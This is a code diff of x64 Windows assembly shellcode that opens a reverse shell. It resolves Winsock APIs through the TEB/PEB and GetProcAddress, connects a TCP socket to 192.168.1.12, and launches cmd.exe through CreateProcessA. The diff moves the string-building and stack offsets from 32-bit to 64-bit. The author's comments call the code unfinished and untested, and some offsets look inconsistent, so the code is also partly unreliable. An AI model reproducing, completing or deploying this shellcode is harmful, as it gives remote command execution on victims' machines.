@@ -104,7 +104,7 @@ _start:
 ;
 ;
 	mov rbp, rsp		; stack
-	sub rsp, 0x20		; string pointer
+	sub rsp, 0x28		; string pointer
 
 	mov rdx, 0x60
 	mov rdx, [gs:rdx]	; TEB
@@ -114,85 +114,81 @@ _start:
 	mov eax, [rdx+0x18]	; KernelBase
 	mov rdi, [rax+0x10]	; KERNELBASE.dll
 
-	mov [rsp+0x1C],rdi
+	mov [rsp+0x18],rdi
+
 
 	; ===========================
 	; make stack pointer str :
 	; ws2_32.dll
 	;============================
 	xor rax,rax
-	mov [rsp+0x18],rax
 	mov [rsp+0x10],rax
-	mov ax,0x6c6c		; ll
+	mov ax,0x6c6c			; ll
 	mov [rsp+0x08],eax
 	mov rax, 0x642e32335f327377 	; _2swd.23
 	mov [rsp],rax
-	lea rax,[esp]		; ws2_32.dll
-	push rax	
+	lea rax,[esp]			; ws2_32.dll
+	;push rax	
 	
 	;
 	;NOT FINISHED TO HERE NOT TESTING, 
 	;ONLY UP HAS BEEN TESTING 
 	;
-	
+
 	mov edi, [LoadLibraryA]	; LoadLibraryAtry to get from FS pointer PEB/TEB
-	call rdi		; call
-	mov [rsp+0x1C], rax	; ESP+14 Offset ws2_32 base dll
-	sub rsp, 0x04		; size 4 SOCKET HANDLE
+	call rdi			; call
+	mov [rsp+0x1C], rax		; ESP+14 Offset ws2_32 base dll
+	sub rsp, 0x08			; size 4 SOCKET HANDLE
 	
 	WSAStartup:
 	xor rax, rax		
-	mov [rsp+0x10],rax	
-	mov rax,0x7075		; pu
-	mov [rsp+0x0c],eax	
-	mov rax, 0x74726174	; trat
-	mov [rsp+0x08],eax
-	mov rax, 0x53415357	; SASW
-	mov [rsp+0x04],eax
-	lea rdx,[rsp+0x4]	; WSAStartup	
+	mov [rsp+0x18],rax	
+	mov rax,0x7075			; pu
+	mov [rsp+0x10],eax	
+	mov rax, 0x7472617453415357	; tratSASW
+	mov [rsp+0x08],rax
+	lea rdx,[rsp+0x08]		; WSAStartup	
 
 	call getproc
-	mov rdi,rax		; ws2_32.WSAStartup
+	mov rdi,rax			; ws2_32.WSAStartup
 
 	xor rax, rax
 	push swd
 	mov ax,0x0202
 	push rax
-	;mov edi, 0x719F6A55 
+	mov edi, 0x719F6A55 
 	call rdi
 
 	WSASocket:
 	xor rax,rax
-	mov ax,0x4174		; t
-	mov [rsp+0x0c],rax
-	mov rax, 0x656b636f	; ekco
+	mov ax,0x4174			; t
+	mov [rsp+0x10],rax
+	mov rax, 0x656b636f53415357	; ekcoSASW
 	mov [rsp+0x08],rax
-	mov rax, 0x53415357	; SASW
-	mov [rsp+0x04],eax
-	lea rdx,[rsp+0x4]	; WSASocket
+	lea rdx,[rsp+0x8]		; WSASocket
 
 	call getproc
-	mov rdi,rax		; ws2_32.WSASocket
+	mov rdi,rax			; ws2_32.WSASocket
 
-	xor rax, rax
-	push rax
-	push rax
-	push rax
-	mov al,0x06	; IPPROTO_TCP
-	push rax	;
-	sub al,0x05	; SOCK_STREAM
-	push rax	;
-	add al,0x01	; AF_INET
-	push rax
-	;mov edi,0x719F8B6A
-	call rdi	
+	xor 	rax, rax
+	push 	rax
+	push 	rax
+	push 	rax
+	mov 	al,0x06	; IPPROTO_TCP
+	push	rax	;
+	sub 	al,0x05	; SOCK_STREAM
+	push	rax	;
+	add	al,0x01	; AF_INET
+	push 	rax
+	;mov 	edi,0x719F8B6A
+	call 	rdi	
 	
-	cmp eax,0xFFFFFFFF
-	je ret
+	cmp 	eax,0xFFFFFFFF
+	je 	ret
 
 	; socket Handle
-	mov rdx,rax
-	mov [rsp],rdx
+	mov 	rdx,rax
+	mov 	[rsp],rdx
 	
 	; SOCKADDR_IN
 	xor rbx, rbx
@@ -203,14 +199,12 @@ _start:
 	mov DWORD[ sss + SOCKADDR_IN.sin_addr ], 0x0c01a8c0 	; IP   192.168.1.12
 
 	WSAConnect:
-	xor rax,rax		; raz eax
-	mov ax,0x7463		; tc
-	mov [rsp+0x0c],eax
-	mov eax, 0x656e6e6f	; enno
-	mov [rsp+0x08],eax
-	mov eax, 0x43415357	; CASW
-	mov [rsp+0x04],eax
-	lea edx,[rsp+0x4]	; WSAConnect
+	xor rax,rax			; raz eax
+	mov ax,0x7463			; tc
+	mov [rsp+0x10],eax
+	mov rax, 0x656e6e6f43415357	; ennoCASW
+	mov [rsp+0x08],rax
+	lea edx,[rsp+0x08]		; WSAConnect
 
 	call getproc
 	mov rdi,rax		; ws2_32.WSAConnect
@@ -243,17 +237,13 @@ _start:
 
 	CreateProcess:
 	xor 	rax, rax
-	mov ax,0x4173		; As
-	mov [rsp+0x10],rax
-	mov rax, 0x7365636f	; seco
-	mov [rsp+0xc],eax
-	mov rax, 0x72506574	; rPet
-	mov [rsp+0x08],eax
-	mov rax, 0x61657243	; aerC
-	mov [rsp+0x04],eax
-	lea rdx,[rsp+0x4]	; CreateProcessA
+	mov 	rax, 0x41737365636f	; seco
+	mov 	[rsp+0x10],rax
+	mov 	rax, 0x7250657461657243	; rPetaerC
+	mov 	[rsp+0x08],rax
+	lea 	rdx,[rsp+0x08]		; CreateProcessA
 
-	mov 	rsi,[esp+0x1C]	; kernel32 base
+	mov 	rsi,[rsp+0x1C]	; kernel32 base
 	push	rdx
 	push 	rsi
 	mov 	rdi,[GetProcAddress]
@@ -278,13 +268,11 @@ _start:
 	
 	ExitProcess:
 	xor 	rax, rax
-	mov rax,0x737365	; sse
-	mov [rsp+0x0C],eax
-	mov rax, 0x636f7250	; corP
-	mov [rsp+0x08],eax
-	mov rax, 0x74697845	; tixE
-	mov [rsp+0x04],eax
-	lea rdx,[rsp+0x4]	; ExitProcess
+	mov 	rax,0x737365		; sse
+	mov 	[rsp+0x10],eax
+	mov 	rax, 0x636f725074697845	; corPtixE
+	mov 	[rsp+0x08],eax
+	lea 	rdx,[rsp+0x08]		; ExitProcess
 
 	mov 	rsi,[rsp+0x1C]	; kernel32 base
 	push	rdx
@@ -301,11 +289,11 @@ _start:
 	leave
 
 getproc:
-	mov rbx,[esp+0x24]
-	push rdx
-	push rbx
-	mov rdi,[GetProcAddress]
-	call rdi
+	mov 	rbx,[rsp+0x24]
+	push 	rdx
+	push 	rbx
+	mov 	rdi,[GetProcAddress]
+	call 	rdi
 	ret
 
 	_cmd: 	db "cmd.exe",0
